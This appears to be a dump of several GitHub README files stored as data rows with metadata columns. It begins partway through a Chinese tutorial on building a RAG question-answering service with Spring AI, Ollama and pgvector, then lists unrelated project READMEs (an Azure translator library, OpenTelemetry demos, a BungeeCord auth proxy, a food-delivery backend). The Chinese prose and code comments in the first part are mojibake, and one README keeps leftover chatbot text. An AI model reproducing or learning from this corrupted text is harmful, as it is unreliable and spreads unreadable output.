	return mergeDocuments;
}

/**
	 * æ ¹æ®å…³é”®è¯æœç´¢å‘é‡åº“
	 *
	 * @param keyword å…³é”®è¯
	 * @return æ–‡æ¡£åˆ—è¡¨
	 */
public List<Document> search(String keyword) {
    return mergeDocuments(vectorStore.similaritySearch(keyword));
}
```



æ¥ä¸‹æ¥æ„å»ºå°è£…promptå’Œè°ƒç”¨å¤§æ¨¡å‹çš„æ–¹æ³•ï¼Œä»£ç éƒ¨åˆ†å¦‚ä¸‹:

```java
/**
 * é—®ç­”,æ ¹æ®è¾“å…¥å†…å®¹å›ç­”
 * @param message è¾“å…¥å†…å®¹
 * @return å›ç­”å†…å®¹
 */
public String chat(String message) {
	//æŸ¥è¯¢è·å–æ–‡æ¡£ä¿¡æ¯
	List<Document> documents = search(message);
	
	//æå–æ–‡æœ¬å†…å®¹
	String content = documents.stream()
			.map(Document::getContent)
			.collect(Collectors.joining(""\n""));
	
	//å°è£…promptå¹¶è°ƒç”¨å¤§æ¨¡å‹
	String chatResponse = ollamaChatClient.call(getChatPrompt2String(message, content));
	return chatResponse;
}

/**
 * è·å–prompt
 * @param message æé—®å†…å®¹
 * @param context ä¸Šä¸‹æ–‡
 * @return prompt
 */
private String getChatPrompt2String(String message, String context) {
	String promptText = """"""
			è¯·ç”¨ä»…ç”¨ä»¥ä¸‹å†…å®¹å›ç­”""%s"":
			%s
			"""""";
	return String.format(promptText, message, context);
}
```



å†æ„å»ºä¸€ä¸ªæ¥å£ç”¨äºç”¨äºæé—®ï¼Œä»£ç éƒ¨åˆ†å¦‚ä¸‹:

```java
@GetMapping(""/chat"")
public ResponseEntity chat(@RequestParam String message) {
    return ResponseEntity.ok(documentService.chat(message));
}
```



é…ç½®ä¿¡æ¯

æœ€åéœ€è¦é…ç½®æ–‡ä»¶ä¸­é…ç½®å‘é‡æ•°æ®åº“ã€embeddingå’Œå¤§æ¨¡å‹chatä¿¡æ¯ï¼Œapplication.ymlé…ç½®éƒ¨åˆ†å¦‚ä¸‹:

```yaml
spring:
  datasource:
    url: jdbc:postgresql://192.168.3.220:5432/postgres
    username: postgres
    password: postgres
  ai:
    vectorstore:
      pgvector:
      	##embeddingçš„å‘é‡ç»´åº¦ï¼Œè¿™é‡Œçš„768æ˜¯æ ¹æ®nomic-embed-textè¿”å›çš„å‘é‡ç»´åº¦é…ç½®çš„
        dimensions: 768
    ollama:
      base-url: http://localhost:11434
      chat:
        model: qwen:7b
      embedding:
        model: nomic-embed-text
```



æµ‹è¯•embeddingæ¨¡å‹çš„å‘é‡ç»´åº¦å¯ä»¥å†™ä¸€ä¸ªæµ‹è¯•æ–¹æ³•æ¥è·å–ï¼Œä»£ç éƒ¨åˆ†å¦‚ä¸‹ï¼š

```java
@Autowired
private EmbeddingClient embeddingClient;

@Test
void embeddingDimensionsTest(){
    //æ‰“å°embeddingæ¨¡å‹çš„è½¬æ¢å‘é‡çš„ç»´åº¦
	System.out.println(embeddingClient.dimensions());
}
```





## æµ‹è¯•

### ä¸Šä¼ æ•°æ®

å‡†å¤‡äº†springAIç®€ä»‹ä¿¡æ¯ä½œä¸ºæµ‹è¯•æ•°æ®[Spring AI :: Spring AI Reference](https://docs.spring.io/spring-ai/reference/index.html)ï¼Œç¿»è¯‘å¦‚ä¸‹ï¼š

```
Spring AIé¡¹ç›®æ—¨åœ¨ç®€åŒ–åŒ…å«äººå·¥æ™ºèƒ½åŠŸèƒ½çš„åº”ç”¨ç¨‹åºçš„å¼€å‘ï¼Œè€Œä¸ä¼šé€ æˆä¸å¿…è¦çš„å¤æ‚æ€§ã€‚
è¯¥é¡¹ç›®ä»è‘—åçš„ Python é¡¹ç›®ä¸­æ±²å–çµæ„Ÿï¼Œä¾‹å¦‚ LangChain å’Œ LlamaIndexï¼Œä½† Spring AI å¹¶ä¸æ˜¯è¿™äº›é¡¹ç›®çš„ç›´æ¥ç§»æ¤ã€‚ è¯¥é¡¹ç›®æˆç«‹çš„ä¿¡å¿µæ˜¯ï¼Œä¸‹ä¸€æ³¢ç”Ÿæˆå¼ AI åº”ç”¨ç¨‹åºå°†ä¸ä»…é€‚ç”¨äº Python å¼€å‘äººå‘˜ï¼Œè€Œä¸”å°†åœ¨è®¸å¤šç¼–ç¨‹è¯­è¨€ä¸­æ— å¤„ä¸åœ¨ã€‚
Spring AI çš„æ ¸å¿ƒæ˜¯æä¾›æŠ½è±¡ï¼Œä½œä¸ºå¼€å‘ AI åº”ç”¨ç¨‹åºçš„åŸºç¡€ã€‚ è¿™äº›æŠ½è±¡å…·æœ‰å¤šç§å®ç°ï¼Œåªéœ€æœ€å°‘çš„ä»£ç æ›´æ”¹å³å¯è½»æ¾äº¤æ¢ç»„ä»¶ã€‚
Spring AI æä¾›ä»¥ä¸‹åŠŸèƒ½ï¼š
1.æ”¯æŒæ‰€æœ‰ä¸»è¦çš„æ¨¡å‹æä¾›å•†ï¼Œå¦‚OpenAIï¼ŒMicrosoftï¼ŒAmazonï¼ŒGoogleå’ŒHuggingfaceã€‚
2.æ”¯æŒçš„æ¨¡å‹ç±»å‹åŒ…æ‹¬èŠå¤©å’Œæ–‡æœ¬åˆ°å›¾åƒï¼Œè¿˜æœ‰æ›´å¤šç±»å‹æ­£åœ¨å¼€å‘ä¸­ã€‚
3.è·¨ AI æä¾›å•†çš„å¯ç§»æ¤ APIï¼Œç”¨äºèŠå¤©å’ŒåµŒå…¥æ¨¡å‹ã€‚æ”¯æŒåŒæ­¥å’Œæµ API é€‰é¡¹ã€‚è¿˜æ”¯æŒä¸‹æ‹‰ä»¥è®¿é—®ç‰¹å®šäºæ¨¡å‹çš„åŠŸèƒ½ã€‚
4.å°† AI æ¨¡å‹è¾“å‡ºæ˜ å°„åˆ° POJOã€‚
5.æ”¯æŒæ‰€æœ‰ä¸»è¦çš„å‘é‡æ•°æ®åº“æä¾›å•†ï¼Œä¾‹å¦‚ Azure Vector Searchã€Chromaã€Milvusã€Neo4jã€PostgreSQL/PGVectorã€PineConeã€Qdrantã€Redis å’Œ Weaviate
6.è·¨ Vector Store æä¾›ç¨‹åºçš„å¯ç§»æ¤ APIï¼ŒåŒ…æ‹¬ä¸€ä¸ªç±»ä¼¼ SQL çš„æ–°é¢–å…ƒæ•°æ®è¿‡æ»¤å™¨ APIï¼Œè¯¥ API ä¹Ÿæ˜¯å¯ç§»æ¤çš„ã€‚
7.å‡½æ•°è°ƒç”¨
8.ç”¨äº AI æ¨¡å‹å’ŒçŸ¢é‡å­˜å‚¨çš„ Spring Boot è‡ªåŠ¨é…ç½®å’Œå¯åŠ¨å™¨ã€‚
9.ç”¨äºæ•°æ®å·¥ç¨‹çš„ ETL æ¡†æ¶
é€šè¿‡æ­¤åŠŸèƒ½é›†ï¼Œæ‚¨å¯ä»¥å®ç°å¸¸è§ç”¨ä¾‹ï¼Œä¾‹å¦‚â€œæ–‡æ¡£é—®ç­”â€æˆ–â€œä¸æ–‡æ¡£èŠå¤©â€ã€‚
æ¦‚å¿µéƒ¨åˆ†æä¾›äº† AI æ¦‚å¿µåŠå…¶åœ¨ Spring AI ä¸­çš„è¡¨ç¤ºçš„é«˜çº§æ¦‚è¿°ã€‚
â€œå…¥é—¨â€éƒ¨åˆ†ä»‹ç»äº†å¦‚ä½•åˆ›å»ºç¬¬ä¸€ä¸ª AI åº”ç”¨ç¨‹åºã€‚ åç»­éƒ¨åˆ†å°†é‡‡ç”¨ä»¥ä»£ç ä¸ºä¸­å¿ƒçš„æ–¹æ³•æ·±å…¥æ¢è®¨æ¯ä¸ªç»„ä»¶å’Œå¸¸è§ç”¨ä¾‹ã€‚
```



ä½¿ç”¨postmanè°ƒç”¨æ¥å£:

![postmanæµ‹è¯•æ–‡ä»¶ä¸Šä¼ ](./img/postmanæµ‹è¯•æ–‡ä»¶ä¸Šä¼ .png)

æœ¬æ¬¡demoä½¿ç”¨å‘é‡æ•°æ®åº“é—®pgvectorï¼Œé¡¹ç›®å¯åŠ¨åï¼Œspring aiä¼šè¿æ¥pgvectorè‡ªåŠ¨åˆ›å»ºvector_storeè¡¨ï¼Œå½“ç„¶ä¹Ÿæ‰‹åŠ¨æå‰åˆ›å»º:

```sql
CREATE EXTENSION IF NOT EXISTS vector;
CREATE EXTENSION IF NOT EXISTS hstore;
CREATE EXTENSION IF NOT EXISTS ""uuid-ossp"";

CREATE TABLE IF NOT EXISTS vector_store (
	id uuid DEFAULT uuid_generate_v4() PRIMARY KEY,
	content text,
	metadata json,
	embedding vector(768) # 768 æ˜¯embeddingæ¨¡å‹nomic-embed-textçš„ç»´åº¦
);

CREATE INDEX ON vector_store USING HNSW (embedding vector_cosine_ops);
```



æµ‹è¯•è¿‡åå¯ä»¥è¿æ¥æ•°æ®åº“æŸ¥è¯¢vector_storeè¡¨çš„æ•°æ®:

![pgvectoræ•°æ®æŸ¥è¯¢](./img/pgvectoræ•°æ®æŸ¥è¯¢.png)



### é—®ç­”æµ‹è¯•

æ•°æ®å‡†å¤‡é˜¶æ®µå·²ç»æµ‹è¯•å®Œæˆï¼Œæ¥ä¸‹æ¥å¯ä»¥æµ‹è¯•é—®ç­”ï¼Œä½¿ç”¨postmanè°ƒç”¨æ¥å£:

![postmanæµ‹è¯•é—®ç­”](./img/postmanæµ‹è¯•é—®ç­”.png)

*æœ¬åœ°CPUè¿è¡Œå¤§æ¨¡å‹è¿˜æ˜¯å¤ªæ…¢äº†ï¼Œä¸€ä¸ªæ¥å£è·‘äº†1åˆ†åŠå¤šã€‚*



## æ€»ç»“

Spring AIç»“åˆOllamaå’Œpgvectorèƒ½å¾ˆæ–¹ä¾¿çš„æ„å»ºä¸€ä¸ªRAGæ–‡æ¡£é—®ç­”åº”ç”¨ã€‚RAGæ•ˆæœå—åˆ°æ–‡æ¡£çš„æ‹†åˆ†ã€embeddingã€æ®µè½æœç´¢ã€promptæ¨¡æ¿ã€å¤§æ¨¡å‹è¿™äº›å› ç´ çš„å½±å“ï¼Œè¦æƒ³ä¼˜åŒ–çš„è¯å¯ä»¥ä»è¿™äº›æ–¹é¢å»è€ƒè™‘ã€‚



**å‚è€ƒï¼š**

[pgvector/pgvector: Open-source vector similarity search for Postgres (github.com)](https://github.com/pgvector/pgvector)

[PGvector :: Spring AI Reference](https://docs.spring.io/spring-ai/reference/api/vectordbs/pgvector.html)

[Ollama Chat :: Spring AI Reference](https://docs.spring.io/spring-ai/reference/api/clients/ollama-chat.html)

[Ollama Embeddings :: Spring AI Reference](https://docs.spring.io/spring-ai/reference/api/embeddings/ollama-embeddings.html)

[qwen (ollama.com)](https://ollama.com/library/qwen)

[mofanke/dmeta-embedding-zh (ollama.com)](https://ollama.com/mofanke/dmeta-embedding-zh)",0,1,1,0.0,"['spring', 'pgvector']","['spring', 'pgvector']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
brenoepics/at4j,main,"# Azure Translator for Java (AT4J)

[![Maven Central](https://img.shields.io/maven-central/v/io.github.brenoepics/at4j?color=blue)](https://central.sonatype.com/artifact/io.github.brenoepics/at4j)
![Static Badge](https://img.shields.io/badge/azure--api-3.0-blue?style=flat&logo=microsoftazure&logoColor=%230080FF&color=%230080FF&link=https%3A%2F%2Flearn.microsoft.com%2Fen-us%2Fazure%2Fai-services%2Ftranslator%2Freference%2Fv3-0-reference)
[![Static Badge](https://img.shields.io/badge/run-l?logo=postman&label=Postman&color=EF5B25)](https://www.postman.com/maintenance-astronaut-2993290/workspace/brenoepics/collection/18589822-dfe7a640-9b94-47a8-b19f-46cb9cc8843e?action=share&creator=18589822)
[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=brenoepics_at4j&metric=coverage)](https://sonarcloud.io/summary/new_code?id=brenoepics_at4j)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=brenoepics_at4j&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=brenoepics_at4j)

An unofficial Java library for translating text using Azure AI Cognitive Services.

## âœ¨ Features

- Text Translation: Translate text from one language (or detect) to another or to a list of languages.
- Language Detection: Detect the language of a given text.
- Profanity Handling: Options for handling profanity in translations.
- Text Type Support: We support both plain text and HTML text translation.
- And more.

## ğŸ“ Documentation

- [AT4J Docs](https://brenoepics.github.io/at4j/)
- [JavaDoc](https://brenoepics.github.io/at4j/javadoc/)

## ğŸ‰ Basic Usage

> [!NOTE]
> Example repository [Azure-Translator-Example](https://github.com/brenoepics/Azure-Translator-Example)

The following example translates a simple Hello World to Portuguese, Spanish and French.

```java
public class ExampleTranslator {
  public static void main(String[] args) {
    // Insert your Azure key and region here
    String azureKey = ""<Your Azure Subscription Key>"";
    String azureRegion = ""<Your Azure Subscription Region>"";
    AzureApi api = new AzureApiBuilder().setKey(azureKey).region(azureRegion).build();

    // Set up translation parameters
    List < String > targetLanguages = List.of(""pt"", ""es"", ""fr"");
    TranslateParams params =
            new TranslateParams(""Hello World!"", targetLanguages).setSourceLanguage(""en"");

    // Translate the text
    Optional < TranslationResponse > translationResult = api.translate(params).join();

    // Print the translations
    translationResult.ifPresent(
            response ->
                    response.getFirstResult().getTranslations().forEach(ExampleTranslator::logLanguage));
  }

  public static void logLanguage(Translation translation) {
    System.out.println(translation.getLanguageCode() + "": "" + translation.getText());
  }
}
```

<details>
     <summary>Expected Output</summary>

```console
pt: OlÃ¡, Mundo!
es: Â¡Hola mundo!
fr: Salut tout le monde!
```

</details>

## ğŸ“¦ Download / Installation

The recommended way to get AT4J is to use a build manager, like Gradle or Maven.

### [AT4J Dependency](https://central.sonatype.com/artifact/io.github.brenoepics/at4j)

<details>
  <summary>Gradle</summary>

```gradle
implementation group: 'io.github.brenoepics', name: 'at4j', version: '1.2.0'
```

</details>
<details>
  <summary>Maven</summary>

```xml

<dependency>
    <groupId>io.github.brenoepics</groupId>
    <artifactId>at4j</artifactId>
    <version>1.2.0</version>
</dependency>
```

</details>
<details>
  <summary>Sbt</summary>

```sbt
libraryDependencies += ""io.github.brenoepics"" % ""at4j"" % ""1.2.0""
```

</details>

### Frequently Asked Questions (FAQ)

**Q:** How do I access Azure Translator Keys for my project?

**A:** You can access your Azure Translator Keys through your Azure portal. Remember to keep your keys secure and
refrain from sharing them publicly. If you suspect a key has been compromised, it's crucial to regenerate it promptly.
For detailed instructions on generating your own keys, refer
to [this guide](https://brenoepics.github.io/at4j/guide/azure-subscription.html#azure-subscription). Additionally, you
can explore the [Azure Free Tier](https://brenoepics.github.io/at4j/guide/azure-subscription.html#azure-free-tier) for
more information.

## ğŸ¤ Thank You!

- **Microsoft Azure**: Supporting our project with a generous grant of $10,000+ in Azure credits, enabling us to use
  virtual machines, document translation and other essential cloud resources for our development needs.
- We extend our sincere thanks to all contributors for their invaluable contributions.

## ğŸ§‘â€ğŸ’» Contributing

Contributions of any kind are welcome. You can start contributing to this library by creating issues, submitting pull
requests or giving a star to the project.

## ğŸ“ƒ License

AT4J is distributed under the [Apache license version 2.0](./LICENSE).
",4,2,7,48.0,"['azure', 'translator', 'java', 'feature', 'documentation', 'basic', 'usage', 'download', 'installation', 'dependency', 'http', 'frequently', 'ask', 'question', 'faq', 'thank', 'you', 'contribute', 'license']","['azure', 'translator', 'java', 'feature', 'documentation']",1.0,"[org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jacoco:jacoco-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
DGuhr/spring-otel-extended,main,"# spring-otel-extended - Extending Springs instrumentation
This repository provides multiple approaches to (auto)-instrument Spring and Spring Boot using the OpenTelemetry java agent and -Instrumentation.

This is a Work in Progress for now. For current TODOs, see [TODOS](#todo) 
## Use Case
At the time of writing this, when you use the OpenTelemetry Java Agent to auto-instrument a Spring-Application, your traces look like in the following picture:
![pic](assets/currentstate.png)

This is a fine Trace, but there might be something missing in the ""in between"", and especially for bigger (often: over-abstracted / over-architected legacy) apps, such a trace can be very hard to read, because it usually consists of way more database calls, so you have one /GET call and then, say, 10s of DB calls, and then another POST call to a downstream service... and so on.

The idea here is to show the intermediate, Spring-annotated steps like in the following picture:

![pic](assets/targetstate.png)

This is actually the same operation that was done in the first picture, but now we see the chain of callers, so it is possible to really understand what part of your app did the database calls.

I know that this leads to the generation of many spans and is therefore not added to the official auto-instrumentation, see [the otel issue](https://github.com/open-telemetry/opentelemetry-java-instrumentation/issues/2574). So, it might not be suitable in production telemetry, but it certainly helped me a lot to understand the inner workings of unknown/legacy spring and spring boot codebases, where those traces consist of 30+ spans, lots of them looking like random database queries. 

Alternatively, one could surely use tools like the great [Grafana Pyroscope](https://github.com/grafana/pyroscope) continuous profiling tool to achieve the same, but the solutions shown in this repository feel more lightweight to me, as I simply do not need to spin up and maintain another component and integrate another agent to achieve a more high-resolution look into the application.

## Overview

This repository consists of 5 services:
1) `official-auto-otel-animal-app`: A Spring Boot-Application with an example structure using `@Component`,`@Service` and `@Repository`.
2) `aspect-based-otel-animal-app`: The same App as 1), but using Springs AOP to add Spans to all public methods for the intermediate Layers.
3) `otel-javaagent-spring-extension`: An OpenTelemetry Java-Agent [Extension](https://opentelemetry.io/docs/languages/java/automatic/extensions/) that extends the official agent capabilities to record the intermediate spans.
4) `extension-based-otel-animal-app`: An app that uses the Java agent extension from 3) to provide the same functionality as the aspect solution, without ""touching the code"".
5) `legacy-tomcat-spring-app`: (More or less) the same applictaion, but running on a legacy spring 5 stack (plain, without spring boot) on tomcat 9 and jdk11. It also uses the custom java agent extension.

## Observability stack in docker 
The Observability-Stack consists of: 
* The apps, packaged as containers
* An OpenTelemetry Collector where the signals are sent to
* Prometheus for metrics 
* Tempo for Traces
* Grafana for visualization

It is built using containers and compose for the sake of simplicity. It is tested using docker. I am happy to hear if it also works for podman and other container solutions.

## Running the stack

First, build the respective modules using e.g. `mvn clean package` in each of the modules (see [TODO](#todo))

**Note**: If you want to build the javaagent extension for use with the legacy app, you have to change the maven properties `<maven.compiler.source>` and `<maven.compiler.target>` to use 11 instead of 21. Without changing this, the extension does not get picked up by the classloader.

You can start the stack simply by running `docker compose up --build -d` from the root directory of this repository. I added the pre-built `otel-javaagent-spring-extension-jdk11-1.0-SNAPSHOT.jar` for convenience reasons directly to the `legacy-tomcat-spring-app/agent` directory in this repository.

The following endpoints are available when the stack is started:
* `official-auto-otel-animal-app`: Call [http://localhost:8081/animals](http://localhost:8081/animals) 
* `aspect-based-otel-animal-app`: Call [http://localhost:8082/animals](http://localhost:8082/animals)
* `extension-based-otel-animal-app`: Call [http://localhost:8083/animals](http://localhost:8083/animals)
* `legacy-tomcat-spring-app`: Call [http://localhost:8084/animals](http://localhost:8083/animals)
* `Grafana`: Call `http://localhost:3001` to access the dashboard. Prometheus and Tempo data sources are already added. Username and Password: `admin // pass`

To stop the stack, call `docker compose down`. 

If you want to delete the existing data, use `docker compose down -v` to delete the named volumes.

## TODO
- use gradle / maven multi-module to make building the apps more convenient (contribution welcome)


# DONE
- Get the custom java agent extension for complemental spring spans to work. ğŸ¥³
- Add Spring legacy example with agent extension ğŸŠ
",0,0,1,0.0,"['extending', 'spring', 'instrumentation', 'use', 'case', 'overview', 'observability', 'stack', 'docker', 'run', 'stack', 'todo', 'done']","['stack', 'extending', 'spring', 'instrumentation', 'use']",5.0,"[org.apache.maven.plugins:maven-war-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,0.0
daylanbueno/auth-api,main,"
ğŸš€ Shared my insights in the latest video! Explored efficient implementation of authentication 
and authorization in Spring applications using Spring Security and JWT. Learn how to enhance the
security of your applications effortlessly, with valuable insights and hands-on demonstrations.
This content aims to contribute to the community by providing tips, best practices, and robust strategies for secure development.
Let's grow together! Watch the video and level up your skills.
ğŸ¤ğŸ’» #SoftwareDevelopment #SpringSecurity #JWT #SharingKnowledge #TechCommunity #DigitalSecurity

## Tecnologies
- Java 17
- Spring boot
- Spring security
- Maven
- Lombok

  Youbube video: https://www.youtube.com/watch?v=aN1R_ilr0qA
",0,0,2,0.0,['tecnologies'],['tecnologies'],1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
Fernanda-Kipper/desafio-anotaai-backend,main,"# Restaurant Marketplace
## AnotaAi Backend Challenge

![Java](https://img.shields.io/badge/java-%23ED8B00.svg?style=for-the-badge&logo=openjdk&logoColor=white)
![Spring](https://img.shields.io/badge/spring-%236DB33F.svg?style=for-the-badge&logo=spring&logoColor=white)
[![Licence](https://img.shields.io/github/license/Ileriayo/markdown-badges?style=for-the-badge)](./LICENSE)
![MongoDB](https://img.shields.io/badge/MongoDB-%234ea94b.svg?style=for-the-badge&logo=mongodb&logoColor=white)
![AWS](https://img.shields.io/badge/AWS-%23FF9900.svg?style=for-the-badge&logo=amazon-aws&logoColor=white)

This project is an API built using **Java, Java Spring, AWS Simple Queue Service, Mongo DB and AWS Simple Storage Service.**

The Microservice was developed for my [Youtube Channel](https://youtu.be/a3tPHH8uwPc?si=vFf-S2H5i3IpVTjN), to demonstrate how to solve the [AnotaAi Backend Challenge](https://github.com/githubanotaai/new-test-backend-nodejs).

## Table of Contents

- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
- [Database](#database)
- [Contributing](#contributing)

## Installation

1. Clone the repository:

```bash
git clone https://github.com/Fernanda-Kipper/desafio-anotaai-backend.git
```

2. Install dependencies with Maven

3. Create a configuration with your runtime environment variables with your AWS Credentials that are used in `application.properties`

```yaml
aws.region=us-east-1
aws.accessKeyId=${AWS_KEY_ID}
aws.secretKey=${AWS_SECRET}
```

**Config Values**

```yaml
AWS_KEY_ID=VALUE;AWS_SECRET=VALUE2
```

**Mongo**

1. Run in terminal:
```bash
docker compose up -d
```

2. Create a DB for mongo using mongo express: http://localhost:8081.

3. Log with admin:pass and create a database called 'product-catalog'.

## Usage

1. Start the application with Maven
2. The API will be accessible at http://localhost:8080

## API Endpoints
The API provides the following endpoints:

**API PRODUCT**
```markdown
POST /api/product - Create a new product
GET /api/product - Retrieve all products
PUT /api/product/{id} - Updates a product
DELETE /api/product/{id} - Delete a product
```

**BODY**
```json
{
  ""title"": ""Produto para postar no tÃ³pico"",
  ""description"": """",
  ""ownerId"": ""4444444"",
  ""categoryId"": ""659d558b0304df732ddd4587"",
  ""price"": 10000
}
```

**API CATEGORY**
```markdown
POST /api/category - Create a new category
GET /api/category - Retrieve all categories
PUT /api/category/{id} - Updates a category
DELETE /api/category/{id} - Delete a category
```

**BODY**
```json
{
  ""id"": ""393948882828"",
  ""title"": ""Teste"",
  ""description"": """",
  ""ownerId"": ""4444444""
}
```

## Contributing

Contributions are welcome! If you find any issues or have suggestions for improvements, please open an issue or submit a pull request to the repository.

When contributing to this project, please follow the existing code style, [commit conventions](https://www.conventionalcommits.org/en/v1.0.0/), and submit your changes in a separate branch.




",0,0,2,5.0,"['restaurant', 'marketplace', 'anotaai', 'backend', 'challenge', 'table', 'content', 'installation', 'usage', 'api', 'endpoint', 'contribute']","['restaurant', 'marketplace', 'anotaai', 'backend', 'challenge']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
ArtformGames/BungeeAuthProxy,master,"```text
   ___                         ___       __  __   ___                   
  / _ )__ _____  ___ ____ ___ / _ |__ __/ /_/ /  / _ \_______ __ ____ __
 / _  / // / _ \/ _ `/ -_) -_) __ / // / __/ _ \/ ___/ __/ _ \\ \ / // /
/____/\_,_/_//_/\_, /\__/\__/_/ |_\_,_/\__/_//_/_/  /_/  \___/_\_\\_, / 
               /___/                                             /___/  
```

README LANGUAGES [ [**English**](README.md) | [ä¸­æ–‡](README_CN.md)  ]

![CodeSize](https://img.shields.io/github/languages/code-size/ArtformGames/BungeeAuthProxy)
[![Download](https://img.shields.io/github/downloads/ArtformGames/BungeeAuthProxy/total)](https://github.com/ArtformGames/BungeeAuthProxy/releases)
[![Java CI with Maven](https://github.com/ArtformGames/BungeeAuthProxy/actions/workflows/maven.yml/badge.svg?branch=master)](https://github.com/ArtformGames//actions/workflows/maven.yml)
![Support](https://img.shields.io/badge/Minecraft-Java%201.16--Latest-green)

# **BungeeAuthProxy**

Authentication proxy injector for BungeeCord servers,
which is trying to solve the problem of inability to access the MineCraft online session and auth service in some areas.

## Usage

**Before using this injector, make sure that your Java version is 11 or above.**

1. Download latest release from [here](https://github.com/ArtformGames/BungeeAuthProxy/releases) .
2. Put the jar file into the folder of your BungeeCord server (same path with server jar).
3. Add the `-javaagent:BungeeAuthProxy.jar[=<CONFIG-FILE-NAME>]` before `-jar <server-jar>.jar` to the start command of
   your BungeeCord server.
    - For example: `java -javaagent:BungeeAuthProxy.jar -jar BungeeCord.jar`
    - Using custom config file name: `java -javaagent:BungeeAuthProxy.jar=auth-proxy.yml -jar BungeeCord.jar`
4. Start your bungeecord server, and configured the proxy (Default is `auth.yml` in server folder).

## Configurations

Will be generated on the first boot up.

```yaml
debug: false

# MineCraft service settings
service:
  # Timeout duration for single request in milliseconds.
  time-out: 5000
  # Authentication url dns-cache expire duration in milliseconds
  # If this value â‰¤0, will disable dns-cache.
  dns-cache-expire: 60000

# Proxy server settings
proxy:
  # Proxy protocol, -1 = NO_PROXY ,0 = HTTP/HTTPS, 1 = SOCKS4, 2 = SOCKS5
  protocol: -1
  # Proxy host
  host: 127.0.0.1
  # Proxy port
  port: 7890
  # Proxy authentication settings
  auth:
    # Whether to enable proxy authentication
    enabled: false
    username: proxy-username
    password: proxy-password

advance:
   # Remove unused field after injection.
   # If any 'NoSuchFieldException' or 'IllegalAccessException' occurred, try to set this to false.
   remove-unused-field: true
```

## Open Source Licence

The source code of this project adopts the [GNU General Public License v3.0](https://opensource.org/licenses/GPL-3.0).

## Supports

This project is mainly developed by the [Artfrom Games](https://github.com/ArtformGames/) .

Many thanks to Jetbrains for kindly providing a license for us to work on this and other open-source projects.  
[![](https://resources.jetbrains.com/storage/products/company/brand/logos/jb_beam.svg)](https://www.jetbrains.com/?from=https://github.com/ArtformGames/BungeeAuthProxy)

",5,0,2,0.0,"['bungeeauthproxy', 'usage', 'configuration', 'minecraft', 'service', 'setting', 'timeout', 'duration', 'single', 'request', 'millisecond', 'authentication', 'url', 'expire', 'duration', 'millisecond', 'if', 'value', 'disable', 'proxy', 'server', 'setting', 'proxy', 'protocol', 'proxy', 'host', 'proxy', 'port', 'proxy', 'authentication', 'setting', 'whether', 'enable', 'proxy', 'authentication', 'remove', 'unused', 'field', 'injection', 'if', 'occur', 'try', 'set', 'false', 'open', 'source', 'licence', 'support']","['proxy', 'setting', 'authentication', 'duration', 'millisecond']",1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
Missuo0o/FoodDeliveryBackend,main,"# Food Delivery Backend System

This is the backend system for a food delivery application, built using Spring Boot. The application leverages a range of technologies including MySQL, Redis, RabbitMQ, and integrates with Alibaba Cloud's OSS and WeChat Pay. This system is designed to be scalable, secure, and efficient, utilizing Spring Boot's extensive support for enterprise-grade applications.

## Configuration

The application is configured to run on port 8080 and is set up with production profiles. It uses MyBatis for ORM, JWT for authentication, and includes advanced logging configurations.

### Technologies Used

- **Spring Boot** - Framework for building Java-based applications.
- **MySQL** - Database for storing user and order data.
- **Redis** - Used as a cache and session store.
- **RabbitMQ** - Messaging broker for handling asynchronous processing.
- **JWT** - For securing REST APIs by providing tokens to verify user identity.
- **MyBatis** - Persistence framework integrating with Spring Boot for data handling.
- **Knife4j** - Enhanced Swagger-compatible interface for visualizing RESTful APIs.
- **Alibaba Cloud OSS** - For storage solutions.
- **WeChat Pay** - Payment integration for handling transactions and refunds.

## Installation

### Prerequisites

You need the following installed on your system:

- Java JDK 23
- Maven
- MySQL
- RabbitMQ
- Redis

### Setup

1. Clone the repository:

   ```bash
   git clone https://github.com/yourusername/food-delivery-backend.git
   ```

2. Navigate to the project directory:

   ```bash
   cd food-delivery-backend
   ```

3. Install dependencies:

   ```bash
   mvn install
   ```

### Configuration

Update the `application.yml` or `application.properties` with your specific settings for MySQL, Redis, RabbitMQ, OSS, and WeChat Pay. This typically includes hosts, ports, usernames, passwords, and other essential configuration details.

Certainly! Here's the section of the README updated to reflect how to run the application using the `java -jar` command instead of Maven directly:

---

## Running the Application

Instead of using Maven to run the application, you can build a jar file and run it directly using the Java command. This is often more suitable for production environments or when deploying the application.

1. First, package the application into a runnable jar file with Maven:

   ```bash
   mvn clean package
   ```

   This command will create a `.jar` file in the `target` directory.

2. Run the application using:

   ```bash
   java -jar target/your-application-name.jar
   ```

   Replace `your-application-name.jar` with the actual name of your jar file generated by Maven.

The application will start running on `http://localhost:8080`.

---

## API Documentation

API documentation is available via Swagger UI and Knife4j at:

- **Swagger UI**: [http://localhost:8080/swagger-ui.html](http://localhost:8080/swagger-ui.html)
- **Knife4j**: [http://localhost:8080/doc.html](http://localhost:8080/doc.html)

## Security

This application uses JWT for authentication. Ensure you configure your JWT settings properly, including secret keys and token names for both admin and user levels.

## Contributing

We appreciate contributions. Please follow the standard GitHub fork-and-pull-request workflow.

## License

This project is licensed under the MIT License - see the LICENSE.md file for details.

---

This README includes detailed instructions for setting up and running your application, along with configuration management practices, to ensure smooth deployment and operation. Adjustments may be necessary to fit your exact setup or additional features.



